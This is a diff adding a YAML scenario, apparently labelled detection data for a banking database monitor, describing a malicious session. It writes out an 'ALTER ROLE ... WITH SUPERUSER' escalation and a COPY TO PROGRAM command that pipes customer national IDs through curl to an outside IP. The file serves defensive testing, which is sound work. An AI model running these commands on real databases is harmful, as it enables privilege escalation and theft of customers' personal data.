@@ -1,0 +1,19 @@
+scenario_id: banking_run_03_altrole_privesc_mal_02
+family_id: banking_run_03_privilege_escalation_alterrole
+domain: banking
+time_of_day: "03:40"
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+  - session_label: escalate_alter
+    role: branch_manager
+    anchor: db
+    timing:
+      tempo: bursty
+      step_gaps_seconds: [1.2]
+    events:
+      - step_id: alter_role
+        sql: "ALTER ROLE branch_manager WITH SUPERUSER"
+      - step_id: exfil
+        sql: "COPY (SELECT customer_id, national_id FROM customers) TO PROGRAM 'gzip | curl -sX POST https://45.33.12.9/collect -d @-'"
+        connects_to: {ip: "45.33.12.9", port: 8443}
